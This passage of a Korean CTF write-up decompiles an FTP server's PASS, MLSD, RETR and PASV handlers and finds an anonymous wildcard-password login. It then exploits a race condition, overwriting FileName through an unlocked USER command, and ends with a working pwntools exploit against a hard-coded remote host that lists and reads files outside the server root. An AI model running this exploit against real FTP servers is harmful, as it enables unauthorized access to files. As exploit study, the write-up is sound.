한다.\n_BOOL8 __fastcall ftpPASS(__int64 a1, const char *password) { int v2; // eax int v3; // r8d char v5[264]; // [rsp+0h] [rbp-138h] BYREF unsigned __int64 v6; // [rsp+108h] [rbp-30h] v6 = __readfsqword(0x28u); if ( !password ) { if ( *(_QWORD *)(a1 + 0x5078) ) return gnutls_record_send() \u0026gt;= 0; else return send(*(_DWORD *)(a1 + 40), \u0026#34;501 Syntax error in parameters or arguments.\\r\\n\u0026#34;, 0x2EuLL, 0x4000) \u0026gt;= 0; } memset(v5, 0, 0x100uLL); if ( !(unsigned int)config_parse((char *)g_cfg, (const char *)(a1 + 0x3078), \u0026#34;pswd\u0026#34;, v5, (char *)\u0026amp;qword_100)// a, pswd, || strcmp(v5, password) \u0026amp;\u0026amp; v5[0] != \u0026#39;*\u0026#39; ) { if ( *(_QWORD *)(a1 + 0x5078) ) return gnutls_record_send() \u0026gt;= 0; return send(*(_DWORD *)(a1 + 40), \u0026#34;530 Invalid user name or password.\\r\\n\u0026#34;, 0x24uLL, 0x4000) \u0026gt;= 0; } *(_QWORD *)(a1 + 0x1078) = 0LL; *(_QWORD *)(a1 + 0x2070) = 0LL; memset( (void *)((a1 + 0x1080) \u0026amp; 0xFFFFFFFFFFFFFFF8LL), 0, 8LL * (((_DWORD)a1 + 0x1078 - (((_DWORD)a1 + 0x1080) \u0026amp; 0xFFFFFFF8) + 4096) \u0026gt;\u0026gt; 3)); memset(v5, 0, 0x100uLL); config_parse((char *)g_cfg, (const char *)(a1 + 0x3078), \u0026#34;root\u0026#34;, (_BYTE *)(a1 + 0x1078), \u0026#34;a\u0026#34;); config_parse((char *)g_cfg, (const char *)(a1 + 0x3078), \u0026#34;accs\u0026#34;, v5, (char *)\u0026amp;qword_100); *(_DWORD *)(a1 + 88) = 0; if ( !strcasecmp(v5, \u0026#34;admin\u0026#34;) ) { v2 = 3; LABEL_7: *(_DWORD *)(a1 + 0x58) = v2; writelogentry(a1, (__int64)\u0026#34; PASS-\u0026gt;successful logon\u0026#34;, (__int64)\u0026#34;\u0026#34;); if ( *(_QWORD *)(a1 + 20600) ) return gnutls_record_send() \u0026gt;= 0; return send(*(_DWORD *)(a1 + 40), \u0026#34;230 User logged in, proceed.\\r\\n\u0026#34;, 0x1EuLL, 0x4000) \u0026gt;= 0; } if ( !strcasecmp(v5, \u0026#34;upload\u0026#34;) ) { v2 = 2; goto LABEL_7; } v3 = strcasecmp(v5, \u0026#34;readonly\u0026#34;); v2 = 1; if ( !v3 ) goto LABEL_7; if ( *(_QWORD *)(a1 + 0x5078) ) return gnutls_record_send() \u0026gt;= 0; return send(*(_DWORD *)(a1 + 40), \u0026#34;530 This account is disabled.\\r\\n\u0026#34;, 0x1FuLL, 0x4000) \u0026gt;= 0; } PASS 함수이다. config 파일에서 유저의 비밀번호를 찾고 인증한다. *면 어떤 비밀번호여도 체크가 패스된다. 아까 config 파일에서 있던 anonymous를 유저 이름으로 주고, 아무 비밀번호나 입력하면, ReadOnly 권한으로 ftp 서버에 접속할 수 있다.\n이제 flag 이름을 읽기 위해서 ftp 명령어들을 구글링 해봤다. MLSD가 나와서 그걸 분석해봤다.\n__int64 __fastcall ftpMLSD(pthread_mutex_t *mutex, char *a2) { int owner; // edx int v4; // eax __int64 align; // rdi int v7; // eax pthread_t newthread; // [rsp+8h] [rbp-C0h] BYREF struct stat64 v9; // [rsp+10h] [rbp-B8h] BYREF unsigned __int64 v10; // [rsp+A8h] [rbp-20h] owner = mutex[2].__owner; v10 = __readfsqword(0x28u); if ( !owner ) { if ( !mutex[515].__align ) return send(mutex[1].__lock, \u0026#34;530 Please login with USER and PASS.\\r\\n\u0026#34;, 0x26uLL, 0x4000) \u0026gt;= 0; return gnutls_record_send() \u0026gt;= 0; } if ( !mutex[1].__kind ) { if ( !mutex[515].__align ) return send(mutex[1].__lock, \u0026#34;550 Another action is in progress, use ABOR command first.\\r\\n\u0026#34;, 0x3CuLL, 0x4000) \u0026gt;= 0; return gnutls_record_send() \u0026gt;= 0; } ftp_effective_path((__int64)(\u0026amp;mutex[105].__align + 2), (__int64)\u0026amp;mutex[3], a2, 0x2000uLL, \u0026amp;mutex[310].__size[8]); v4 = stat64(\u0026amp;mutex[310].__size[8], \u0026amp;v9); // get stat of file align = mutex[515].__align; if ( !v4 \u0026amp;\u0026amp; (v9.st_mode \u0026amp; 0xF000) == 0x4000 ) { if ( align ) gnutls_record_send(); else send(mutex[1].__lock, \u0026#34;150 File status okay; about to open data connection.\\r\\n\u0026#34;, 0x36uLL, 0x4000); writelogentry((__int64)mutex, (__int64)\u0026#34; MLSD-LIST \u0026#34;, (__int64)a2); mutex[1].__spins = 0; pthread_mutex_lock(mutex); v7 = pthread_create(\u0026amp;newthread, 0LL, (void *(*)(void *))mlsd_thread, mutex); mutex[1].__kind = v7; if ( v7 ) { if ( mutex[515].__align ) gnutls_record_send(); else send(mutex[1].__lock, \u0026#34;451 Requested action aborted. Local error in processing.\\r\\n\u0026#34;, 0x3AuLL, 0x4000); } else { *(\u0026amp;mutex[1].__align + 1) = newthread; } pthread_mutex_unlock(mutex); return 1LL; } else if ( align ) { return gnutls_record_send() \u0026gt;= 0; } else { return send(mutex[1].__lock, \u0026#34;550 File or directory unavailable.\\r\\n\u0026#34;, 0x24uLL, 0x4000) \u0026gt;= 0; } } mutex로 critical section을 하나의 쓰레드만 진입하도록 해준것 같다. ftp_effective_path 함수로 경로를 얻어오고 stat으로 체크한다. 여기서 쓰레드로 mlsd_thread 함수를 호출한다. 첫번째 인자는 mutex 그대로 넘겨준다.\nvoid *__fastcall mlsd_thread(pthread_mutex_t *a1) { int v1; // ebx DIR *v2; // rbp struct dirent64 *v3; // rcx __int64 align; // rdi pthread_mutex_t *v5; // rbx _BYTE fd[12]; // [rsp+14h] [rbp-94h] BYREF __pthread_unwind_buf_t buf; // [rsp+20h] [rbp-88h] BYREF buf.__pad[4] = (void *)__readfsqword(0x28u); pthread_mutex_lock(a1); if ( __sigsetjmp((struct __jmp_buf_tag *)\u0026amp;buf, 0) ) { cleanup_handler(a1); __pthread_unwind_next(\u0026amp;buf); } v1 = 0; __pthread_register_cancel(\u0026amp;buf); *(_DWORD *)\u0026amp;fd[8] = 0; *(_QWORD *)fd = (unsigned int)create_datasocket(a1); if ( *(_DWORD *)fd != -1 ) { if ( !a1[515].__align || (unsigned int)ftp_init_tls_session(\u0026amp;fd[4], *(unsigned int *)fd, 0) ) { v2 = opendir(\u0026amp;a1[310].__size[8]); // open dir if ( v2 ) { do { v3 = readdir64(v2); if ( !v3 ) break; v1 = mlsd_sub(\u0026amp;a1[310].__align + 1, *(unsigned int *)fd, *(_QWORD *)\u0026amp;fd[4], v3); if ( !v1 ) break; } while ( !a1[1].__spins ); closedir(v2); } } if ( *(_QWORD *)\u0026amp;fd[4] ) { gnutls_bye(*(_QWORD *)\u0026amp;fd[4], 0LL); gnutls_deinit(); } } writelogentry((__int64)a1, (__int64)\u0026#34; MLSD complete\u0026#34;, (__int64)\u0026#34;\u0026#34;); align = a1[515].__align; if ( *(_DWORD *)fd != -1 ) { if ( !a1[1].__spins \u0026amp;\u0026amp; v1 ) { if ( !align ) { send(a1[1].__lock, \u0026#34;226 Transfer complete. Closing data connection.\\r\\n\u0026#34;, 0x31uLL, 0x4000); goto LABEL_18; } } else if ( !align ) { send(a1[1].__lock, \u0026#34;426 Connection closed; transfer aborted.\\r\\n\u0026#34;, 0x2AuLL, 0x4000); goto LABEL_18; } gnutls_record_send(); LABEL_18: close(*(int *)fd); a1[1].__count = -1; v5 = a1; goto LABEL_19; } if ( align ) gnutls_record_send(); else send(a1[1].__lock, \u0026#34;451 Requested action aborted. Local error in processing.\\r\\n\u0026#34;, 0x3AuLL, 0x4000); v5 = a1; LABEL_19: v5[1].__kind = -1; __pthread_unregister_cancel(\u0026amp;buf); pthread_mutex_unlock(v5); return 0LL; } create_datasocket으로 데이터 소켓을 따로 연다. 그리고 opendir, readdir을 해주고 datasocket으로 결과를 보내준다.\n__int64 __fastcall mlsd_sub(__int64 a1, int a2, __int64 a3, _BYTE *a4) { __int64 result; // rax size_t v6; // rdx struct tm v7; // [rsp+0h] [rbp-2118h] BYREF struct stat64 v8; // [rsp+40h] [rbp-20D8h] BYREF char file[24]; // [rsp+D0h] [rbp-2048h] BYREF unsigned __int64 v10; // [rsp+20D8h] [rbp-40h] v10 = __readfsqword(0x28u); if ( a4[19] != 46 || (result = 1LL, a4[20]) ) { if ( a4[19] != 46 || a4[20] != 46 || (result = 1LL, a4[21]) ) { __snprintf_chk((__int64)file, 0x2000LL, 1LL, 0x2000LL, \u0026#34;%s/%s\u0026#34;); if ( !lstat64(file, \u0026amp;v8) ) { localtime_r(\u0026amp;v8.st_mtim.tv_sec, \u0026amp;v7); ++v7.tm_mon; __snprintf_chk( (__int64)file, 0x2000LL, 1LL, 0x2000LL, \u0026#34;type=%s;%s=%llu;UNIX.mode=%lo;UNIX.owner=%lu;UNIX.group=%lu;modify=%u%02u%02u%02u%02u%02u; %s\\r\\n\u0026#34;); } v6 = strlen(file); if ( a3 ) return gnutls_record_send() \u0026gt;= 0; else return send(a2, file, v6, 0x4000) \u0026gt;= 0; } } return result; } mlsd_sub 함수가 결과를 보내주는 역할을 한다.\n_BOOL8 __fastcall ftpPASV(__int64 a1) { size_t v1; // rdx if ( *(_DWORD *)(a1 + 88) ) { if ( *(_DWORD *)(a1 + 56) ) { if ( (unsigned int)pasv_part_0() ) { __snprintf_chk(a1 + 12408, 0x2000LL, 1LL, 0x2000LL, \u0026#34;227 Entering Passive Mode (%u,%u,%u,%u,%u,%u).\\r\\n\u0026#34;); writelogentry(a1, (__int64)\u0026#34; entering passive mode\u0026#34;, (__int64)\u0026#34;\u0026#34;); v1 = strlen((const char *)(a1 + 12408)); if ( *(_QWORD *)(a1 + 20600) ) return gnutls_record_send() \u0026gt;= 0; else return send(*(_DWORD *)(a1 + 40), (const void *)(a1 + 12408), v1, 0x4000) \u0026gt;= 0; } else { return 1LL; } } else { if ( *(_QWORD *)(a1 + 20600) ) gnutls_record_send(); else send(*(_DWORD *)(a1 + 40), \u0026#34;550 Another action is in progress, use ABOR command first.\\r\\n\u0026#34;, 0x3CuLL, 0x4000); return 1LL; } } else { if ( *(_QWORD *)(a1 + 20600) ) gnutls_record_send(); else send(*(_DWORD *)(a1 + 40), \u0026#34;530 Please login with USER and PASS.\\r\\n\u0026#34;, 0x26uLL, 0x4000); return 1LL; } } ftp 패시브 모드가 구현된 함수다. 포트를 열어주고 유저가 특정 포트로 접속해서 데이터를 받는 형식이다.\n_BOOL8 __fastcall ftpRETR(pthread_mutex_t *mutex, __int64 a2) { int owner; // edx int lock; // edi int v5; // eax __int64 align; // rdi int v8; // eax pthread_t newthread; // [rsp+8h] [rbp-C0h] BYREF struct stat64 v10; // [rsp+10h] [rbp-B8h] BYREF unsigned __int64 v11; // [rsp+A8h] [rbp-20h] owner = mutex[2].__owner; v11 = __readfsqword(0x28u); if ( !owner ) { if ( !mutex[515].__align ) return send(mutex[1].__lock, \u0026#34;530 Please login with USER and PASS.\\r\\n\u0026#34;, 0x26uLL, 0x4000) \u0026gt;= 0; return gnutls_record_send() \u0026gt;= 0; } if ( !mutex[1].__kind ) { if ( !mutex[515].__align ) return send(mutex[1].__lock, \u0026#34;550 Another action is in progress, use ABOR command first.\\r\\n\u0026#34;, 0x3CuLL, 0x4000) \u0026gt;= 0; return gnutls_record_send() \u0026gt;= 0; } if ( !a2 ) { if ( !mutex[515].__align ) return send(mutex[1].__lock, \u0026#34;501 Syntax error in parameters or arguments.\\r\\n\u0026#34;, 0x2EuLL, 0x4000) \u0026gt;= 0; return gnutls_record_send() \u0026gt;= 0; } lock = mutex[2].__lock; if ( lock != -1 ) { close(lock); mutex[2].__lock = -1; } ftp_effective_path(\u0026amp;mutex[105].__align + 2, \u0026amp;mutex[3], a2, 0x2000LL, \u0026amp;mutex[310].__align + 1); v5 = stat64(\u0026amp;mutex[310].__size[8], \u0026amp;v10); align = mutex[515].__align; if ( v5 || (v10.st_mode \u0026amp; 0xF000) == 0x4000 ) { if ( align ) return gnutls_record_send() \u0026gt;= 0; else return send(mutex[1].__lock, \u0026#34;550 File or directory unavailable.\\r\\n\u0026#34;, 0x24uLL, 0x4000) \u0026gt;= 0; } else { if ( align ) gnutls_record_send(); else send(mutex[1].__lock, \u0026#34;150 File status okay; about to open data connection.\\r\\n\u0026#34;, 0x36uLL, 0x4000); writelogentry((__int64)mutex, (__int64)\u0026#34; RETR: \u0026#34;, a2); mutex[1].__spins = 0; pthread_mutex_lock(mutex); v8 = pthread_create(\u0026amp;newthread, 0LL, retr_thread, mutex); mutex[1].__kind = v8; if ( v8 ) { if ( mutex[515].__align ) gnutls_record_send(); else send(mutex[1].__lock, \u0026#34;451 Requested action aborted. Local error in processing.\\r\\n\u0026#34;, 0x3AuLL, 0x4000); } else { *(\u0026amp;mutex[1].__align + 1) = newthread; } pthread_mutex_unlock(mutex); return 1LL; } } RETR 명령어가 구현된 함수다. 파일을 읽는데 필요하다.\nvoid *__fastcall retr_thread(__int64 a1) { void *v1; // rbp void *max_size; // r13 int v4; // eax int v5; // r12d char v6; // r14 __int64 v7; // rdi __int64 v8; // rbx __int64 v9; // rax signed __int64 v10; // rax signed __int64 v11; // r14 __int64 v13; // [rsp+18h] [rbp-D0h] int fd; // [rsp+24h] [rbp-C4h] __int64 v15; // [rsp+28h] [rbp-C0h] BYREF struct timespec tp; // [rsp+30h] [rbp-B8h] BYREF __pthread_unwind_buf_t buf; // [rsp+40h] [rbp-A8h] BYREF buf.__pad[4] = (void *)__readfsqword(0x28u); pthread_mutex_lock((pthread_mutex_t *)a1); if ( __sigsetjmp((struct __jmp_buf_tag *)\u0026amp;buf, 0) ) { cleanup_handler((pthread_mutex_t *)a1); __pthread_unwind_next(\u0026amp;buf); } __pthread_register_cancel(\u0026amp;buf); v15 = 0LL; clock_gettime(1, \u0026amp;tp); v1 = malloc((size_t)\u0026amp;_data_start); if ( !v1 ) { *(_DWORD *)(a1 + 80) = -1; goto LABEL_26; } fd = create_datasocket(a1); if ( fd != -1 ) { if ( *(_QWORD *)(a1 + 20600) ) { if ( !(unsigned int)ftp_init_tls_session(\u0026amp;v15, fd, 0) ) goto LABEL_6; max_size = (void *)gnutls_record_get_max_size(v15); if ( max_size \u0026gt; \u0026amp;_data_start ) max_size = \u0026amp;_data_start; } else { max_size = \u0026amp;_data_start; } v4 = open64((const char *)(a1 + 12408), 0); *(_DWORD *)(a1 + 80) = v4; v5 = v4; if ( v4 != -1 ) { v6 = 0; if ( *(_QWORD *)(a1 + 104) == lseek64(v4, *(_QWORD *)(a1 + 104), 0) ) { if ( *(_DWORD *)(a1 + 60) ) { v13 = 0LL; v6 = 1; } else { v8 = 0LL; do { v10 = read(v5, v1, (size_t)max_size); v11 = v10; if ( !v10 ) break; if ( v10 \u0026gt;= 0 ) { v9 = v15 ? gnutls_record_send() : send(fd, v1, v10, 0x4000); if ( v11 == v9 ) continue; } v13 = v8; v6 = 0; goto LABEL_41; v8 += v11; } while ( !*(_DWORD *)(a1 + 60) ); v13 = v8; v6 = 1; } LABEL_41: clock_gettime(1, \u0026amp;tp); *(_QWORD *)(a1 + 20616) += v13; ++*(_QWORD *)(a1 + 20632); __snprintf_chk( (char *)v1, (__int64)max_size, 1LL, (__int64)\u0026amp;_data_start, \u0026#34; RETR complete. %zd bytes (%f MBytes) total sent in %f seconds (%f MBytes/s)\u0026#34;); writelogentry(a1, (__int64)v1, (__int64)\u0026#34;\u0026#34;); } close(v5); *(_DWORD *)(a1 + 0x50) = -1; free(v1); v7 = *(_QWORD *)(a1 + 0x5078); if ( !*(_DWORD *)(a1 + 0x3C) \u0026amp;\u0026amp; v6 ) { if ( !v7 ) { send(*(_DWORD *)(a1 + 40), \u0026#34;226 Transfer complete. Closing data connection.\\r\\n\u0026#34;, 0x31uLL, 0x4000); goto LABEL_9; } goto LABEL_8; } LABEL_7: if ( !*(_QWORD *)(a1 + 0x5078) ) { send(*(_DWORD *)(a1 + 40), \u0026#34;426 Connection closed; transfer aborted.\\r\\n\u0026#34;, 0x2AuLL, 0x4000); goto LABEL_9; } LABEL_8: gnutls_record_send(); LABEL_9: close(fd); *(_DWORD *)(a1 + 44) = -1; goto LABEL_10; } } LABEL_6: *(_DWORD *)(a1 + 80) = -1; free(v1); if ( fd != -1 ) goto LABEL_7; LABEL_26: if ( *(_QWORD *)(a1 + 20600) ) gnutls_record_send(); else send(*(_DWORD *)(a1 + 40), \u0026#34;451 Requested action aborted. Local error in processing.\\r\\n\u0026#34;, 0x3AuLL, 0x4000); LABEL_10: if ( v15 ) { gnutls_bye(); gnutls_deinit(); } *(_DWORD *)(a1 + 56) = -1; __pthread_unregister_cancel(\u0026amp;buf); pthread_mutex_unlock((pthread_mutex_t *)a1); return 0LL; } 쓰레드로 돌아간다. 다른 함수랑 비슷하게 mutex 걸고 간다. 파일을 읽고 datasocket으로 보내준다.\nftp_effective_path 함수는 소스코드를 읽으면서 분석했다.\nint ftp_normalize_path(char* path, size_t npath_len, char* npath) { char* p0; size_t node_len; int status = 1; pftp_path_node nodes = NULL, newnode; if ((path == NULL) || (npath == NULL) || (npath_len \u0026lt; 2)) return 0; if (*path == \u0026#39;/\u0026#39;) { *npath = \u0026#39;/\u0026#39;; ++path; ++npath; --npath_len; } p0 = path; while (*path != 0) { while ((*path != \u0026#39;/\u0026#39;) \u0026amp;\u0026amp; (*path != \u0026#39;\\0\u0026#39;)) ++path; node_len = path - p0; while (node_len \u0026gt; 0) { /* we have a \u0026#34;this dir\u0026#34; sign: just skip it */ if (strncmp(p0, \u0026#34;.\u0026#34;, node_len) == 0) break; if (strncmp(p0, \u0026#34;..\u0026#34;, node_len) == 0) { /* we have a \u0026#34;dir-up\u0026#34; sign: unlink and free prev node */ if (nodes) { newnode = nodes-\u0026gt;prev; free(nodes); if (newnode) newnode-\u0026gt;next = NULL; nodes = newnode; } } else { newnode = x_malloc(sizeof(ftp_path_node)); newnode-\u0026gt;value = p0; newnode-\u0026gt;length = node_len; newnode-\u0026gt;next = NULL; newnode-\u0026gt;prev = nodes; if (nodes) nodes-\u0026gt;next = newnode; nodes = newnode; } break; } if (*path != 0) ++path; p0 = path; } /* return to head */ newnode = nodes; while (newnode) { nodes = newnode; newnode = newnode-\u0026gt;prev; } while (nodes) { if (npath_len \u0026lt; nodes-\u0026gt;length + 1) { status = 0; break; } strncpy(npath, nodes-\u0026gt;value, nodes-\u0026gt;length); npath += nodes-\u0026gt;length; *npath = \u0026#39;/\u0026#39;; ++npath; npath_len -= nodes-\u0026gt;length + 1; newnode = nodes; nodes = newnode-\u0026gt;next; free(newnode); } /* free the remaining nodes in case of break */ while (nodes) { newnode = nodes; nodes = newnode-\u0026gt;next; free(newnode); } if ((npath_len == 0) || (status == 0)) return 0; *npath = \u0026#39;\\0\u0026#39;; return 1; } int ftp_effective_path(char *root_path, char *current_path, char *file_path, size_t result_size, char *result) { char path[PATH_MAX*2], normalized_path[PATH_MAX]; int status; size_t len; memset(result, 0, result_size); if (file_path == NULL) file_path = \u0026#34;\u0026#34;; if (*file_path == \u0026#39;/\u0026#39;) { status = ftp_normalize_path(file_path, PATH_MAX, normalized_path); } else { snprintf(path, PATH_MAX*2, \u0026#34;%s/%s\u0026#34;, current_path, file_path); status = ftp_normalize_path(path, PATH_MAX, normalized_path); } if (status == 0) return 0; snprintf(path, PATH_MAX*2, \u0026#34;%s/%s\u0026#34;, root_path, normalized_path); status = ftp_normalize_path(path, result_size, result); /* delete last slash */ len = strlen(result); if (len \u0026gt;= 2) { if (result[len-1] == \u0026#39;/\u0026#39;) result[len-1] = \u0026#39;\\0\u0026#39;; } return status; } 기본적으로 root path와 file path를 마지막에 붙여준다. ..이나 .같은 상대주소 처리도 제대로 구현되어있다.\n분석하면서 왜 mutex가 엄청 큰지 궁금했는데, 역시 구조체로 구현되어있었다.\ntypedef struct _FTPCONTEXT { pthread_mutex_t MTLock; SOCKET ControlSocket; SOCKET DataSocket; pthread_t WorkerThreadId; /* * WorkerThreadValid is output of pthread_create * therefore zero is VALID indicator and -1 is invalid. */ int WorkerThreadValid; int WorkerThreadAbort; in_addr_t ServerIPv4; in_addr_t ClientIPv4; in_addr_t DataIPv4; in_port_t DataPort; int File; int Mode; int Access; int SessionID; int DataProtectionLevel; off_t RestPoint; uint64_t BlockSize; char CurrentDir[PATH_MAX]; char RootDir[PATH_MAX]; char RnFrom[PATH_MAX]; char FileName[2*PATH_MAX]; gnutls_session_t TLS_session; SESSION_STATS Stats; } FTPCONTEXT, *PFTPCONTEXT; 함수가 호출되면서 FTPCONTEXT가 첫번째 인자로 들어가고 두번째 인자는 명령어의 operand가 들어간다. File이나, Access, Mode같은 필드들이 있었다.\nExploitation int ftpUSER(PFTPCONTEXT context, const char *params) { if ( params == NULL ) return sendstring(context, error501); context-\u0026gt;Access = FTP_ACCESS_NOT_LOGGED_IN; writelogentry(context, \u0026#34; USER: \u0026#34;, (char *)params); snprintf(context-\u0026gt;FileName, sizeof(context-\u0026gt;FileName), \u0026#34;331 User %s OK. Password required\\r\\n\u0026#34;, params); sendstring(context, context-\u0026gt;FileName); /* Save login name to FileName for the next PASS command */ strcpy(context-\u0026gt;FileName, params); return 1; } ftpUSER에서 FileName이 덮힌다. ftp_effective_path에서\nsnprintf(path, PATH_MAX*2, \u0026#34;%s/%s\u0026#34;, root_path, normalized_path); 위와 같이 root_path와 normalized_path를 붙이고 ..과 .은 독립적으로 처리가 되기 때문에 Path Traversal은 불가능하다.\nftp_effective_path(context-\u0026gt;RootDir, context-\u0026gt;CurrentDir, params, sizeof(context-\u0026gt;FileName), context-\u0026gt;FileName); while (stat(context-\u0026gt;FileName, \u0026amp;filestats) == 0) { if ( !S_ISDIR(filestats.st_mode) ) break; sendstring(context, interm150); writelogentry(context, \u0026#34; MLSD-LIST \u0026#34;, (char *)params); context-\u0026gt;WorkerThreadAbort = 0; pthread_mutex_lock(\u0026amp;context-\u0026gt;MTLock); ftpMLSD 함수의 일부분을 보면, ftp_effective_path를 호출하고 context-\u0026gt;FileName을 체크하는 것을 알 수 있다. 이때 root_path가 /server/data라서 거기에 있는 hello.txt를 읽고, mutex가 unlock될때 읽으면 된다고 생각했다. 그때 mutex를 잘못알고 있어서, 저렇게 생각했었는데, 나중에 알아보니 굳이 mutex unlock 되고 바꿀 필요가 없었다. 그때는 왜 lock 되어있는데 값이 바뀌는지 궁금했지만, 그냥 되길래 익스플로잇 코드를 짰었다.\nmutex는 기본적으로 쓰레드간 critical section 동시 진입을 막기 위해 존재한다. 그래서 lock을 걸면 mutex에 특정 값을 세팅하고 다른 쓰레드가 critical section에 진입하려하면 lock을 통해 mutex를 보고 막는다. 만약 다른 쓰레드가 lock을 하지 않고 그냥 돌리게 되면 mutex를 확인도 안하고 그냥 돌리게 된다. 결과적으로 lock 되었는데도 불구하고 다른 쓰레드가 shared variable에 접근할 수 있게된다.\nint ftpUSER(PFTPCONTEXT context, const char *params) { if ( params == NULL ) return sendstring(context, error501); context-\u0026gt;Access = FTP_ACCESS_NOT_LOGGED_IN; writelogentry(context, \u0026#34; USER: \u0026#34;, (char *)params); snprintf(context-\u0026gt;FileName, sizeof(context-\u0026gt;FileName), \u0026#34;331 User %s OK. Password required\\r\\n\u0026#34;, params); sendstring(context, context-\u0026gt;FileName); /* Save login name to FileName for the next PASS command */ strcpy(context-\u0026gt;FileName, params); return 1; } ftpUSER 함수에서 mutex lock을 안해서 mutex와 상관없이 context 구조체에 접근할 수 있다.\nftp_effective_path((__int64)(\u0026amp;mutex[105].__align + 2), (__int64)\u0026amp;mutex[3], a2, 0x2000uLL, \u0026amp;mutex[310].__size[8]); v4 = stat64(\u0026amp;mutex[310].__size[8], \u0026amp;v9); // get stat of file align = mutex[515].__align; if ( !v4 \u0026amp;\u0026amp; (v9.st_mode \u0026amp; 0xF000) == 0x4000 ) { if ( align ) gnutls_record_send(); else send(mutex[1].__lock, \u0026#34;150 File status okay; about to open data connection.\\r\\n\u0026#34;, 0x36uLL, 0x4000); writelogentry((__int64)mutex, (__int64)\u0026#34; MLSD-LIST \u0026#34;, (__int64)a2); mutex[1].__spins = 0; pthread_mutex_lock(mutex); v7 = pthread_create(\u0026amp;newthread, 0LL, (void *(*)(void *))mlsd_thread, mutex); mlsd_thread를 호출한다. 그래서 이때 ftpUSER를 호출할 수 있는 상태가 된다.\nbuf.__pad[4] = (void *)__readfsqword(0x28u); pthread_mutex_lock(a1); if ( __sigsetjmp((struct __jmp_buf_tag *)\u0026amp;buf, 0) ) { cleanup_handler(a1); __pthread_unwind_next(\u0026amp;buf); } v1 = 0; __pthread_register_cancel(\u0026amp;buf); mlsd_thread 함수의 첫부분을 보면 이때 mutex를 거는데, ftpUSER에서 mutex 상관없이 바꿀 수 있어서 사실상 무용지물이 된다.\n*(_QWORD *)fd = (unsigned int)create_datasocket(a1); if ( *(_DWORD *)fd != -1 ) { if ( !a1[515].__align || (unsigned int)ftp_init_tls_session(\u0026amp;fd[4], *(unsigned int *)fd, 0) ) { v2 = opendir(\u0026amp;a1[310].__size[8]); // open dir if ( v2 ) { do { v3 = readdir64(v2); if ( !v3 ) break; v1 = mlsd_sub(\u0026amp;a1[310].__align + 1, *(unsigned int *)fd, *(_QWORD *)\u0026amp;fd[4], v3); if ( !v1 ) break; } while ( !a1[1].__spins ); closedir(v2); } mutex 걸고 create_datasocket을 호출해서 fd를 받아오는데, PASSIVE MODE 걸어주고 돌리면, 포트에 접속할때까지 create_datasocket에서 멈춘다. 그래서 멈췄을때 바로 FileName을 바꿔주면 안정적으로 race condition을 트리거할 수 있다.\nfd로 결과를 보내준다. 이걸로 flag의 이름을 알 수 있다.\nfd = create_datasocket(a1); if ( fd != -1 ) { if ( *(_QWORD *)(a1 + 20600) ) { if ( !(unsigned int)ftp_init_tls_session(\u0026amp;v15, fd, 0) ) goto LABEL_6; max_size = (void *)gnutls_record_get_max_size(v15); if ( max_size \u0026gt; \u0026amp;_data_start ) max_size = \u0026amp;_data_start; } else { max_size = \u0026amp;_data_start; } v4 = open64((const char *)(a1 + 12408), 0); *(_DWORD *)(a1 + 80) = v4; v5 = v4; 이거랑 같은 맥락으로 retr_thread도 FileName을 바꿔주면 된다. 당연히 앞에 ftpUSER 함수에서 user name을 바꿨으니 다시 로그인?을 해줘야한다.\nSOCKET create_datasocket(PFTPCONTEXT context) { SOCKET\tclientsocket = INVALID_SOCKET; struct sockaddr_in\tladdr; socklen_t\tasz; memset(\u0026amp;laddr, 0, sizeof(laddr)); switch ( context-\u0026gt;Mode ) { case MODE_NORMAL: clientsocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); context-\u0026gt;DataSocket = clientsocket; if ( clientsocket == INVALID_SOCKET ) return INVALID_SOCKET; laddr.sin_family = AF_INET; laddr.sin_port = context-\u0026gt;DataPort; laddr.sin_addr.s_addr = context-\u0026gt;DataIPv4; if ( connect(clientsocket, (const struct sockaddr *)\u0026amp;laddr, sizeof(laddr)) == -1 ) { close(clientsocket); return INVALID_SOCKET; } break; case MODE_PASSIVE: asz = sizeof(laddr); clientsocket = accept(context-\u0026gt;DataSocket, (struct sockaddr *)\u0026amp;laddr, \u0026amp;asz); close(context-\u0026gt;DataSocket); context-\u0026gt;DataSocket = clientsocket; if ( clientsocket == INVALID_SOCKET ) return INVALID_SOCKET; context-\u0026gt;DataIPv4 = 0; context-\u0026gt;DataPort = 0; context-\u0026gt;Mode = MODE_NORMAL; break; default: return INVALID_SOCKET; } return clientsocket; } PASSIVE MODE로 세팅해주고, 서버가 제공하는 포트에 접속해서 데이터를 받아주면 된다.\nfrom pwn import * sa = lambda x,y : p.sendafter(x,y) s = lambda x : p.send(x) rvu = lambda x : p.recvuntil(x) local =False if local==True: ip = \u0026#39;127.0.0.1\u0026#39; mip = b\u0026#39;127,0,0,1\u0026#39; else : ip = \u0026#39;47.89.253.219\u0026#39; mip = b\u0026#39;0,0,0,0\u0026#39; p = remote(ip,2121) context.log_level=\u0026#39;debug\u0026#39; pay = b\u0026#39;USER anonymous\\r\\n\u0026#39; sa(b\u0026#39;ready\u0026#39;,pay) pay = b\u0026#39;PASS AAAAA\\r\\n\u0026#39; sa(b\u0026#39; OK\u0026#39;,pay) pay = b\u0026#39;PASV \\r\\n\u0026#39; sa(b\u0026#39;logged in\u0026#39;,pay) pay = b\u0026#39;MLSD /\\r\\n\u0026#39; sa(b\u0026#39;Passive\u0026#39;,pay) rvu(mip+b\u0026#39;,\u0026#39;) recv = rvu(b\u0026#39;)\u0026#39;)[:-1].split(b\u0026#39;,\u0026#39;) recv = [int(x) for x in recv] port = recv[0] * 256 + recv[1] success(f\u0026#34;nc {ip} {port}\u0026#34;) s(b\u0026#39;USER /\\r\\n\u0026#39;) print(\u0026#34;flag name : \u0026#34;,end=\u0026#39;\u0026#39;) flag = input() s(b\u0026#39;USER anonymous\\r\\n\u0026#39;) sa(b\u0026#39; OK\u0026#39;,b\u0026#39;PASS AAAAA\\r\\n\u0026#39;) sa(b\u0026#39;logged in\u0026#39;,b\u0026#39;PASV \\r\\n\u0026#39;) rvu(mip+b\u0026#39;,\u0026#39;) recv = rvu(b\u0026#39;)\u0026#39;)[:-1].split(b\u0026#39;,\u0026#39;) recv = [int(x) for x in recv] port = recv[0] * 256 + recv[1] success(f\u0026#34;nc {ip} {port}\u0026#34;) flag = \u0026#34;/\u0026#34;+flag pay = b\u0026#39;RETR /hello.txt\\r\\n\u0026#39; s(pay) s(f\u0026#39;USER {flag[:-1]}\\r\\n\u0026#39;) p.interactive() nc로 직접 접속해줘야된다. flag 이름 넣어주고 다른 포트로 다시 접속하면 된다. 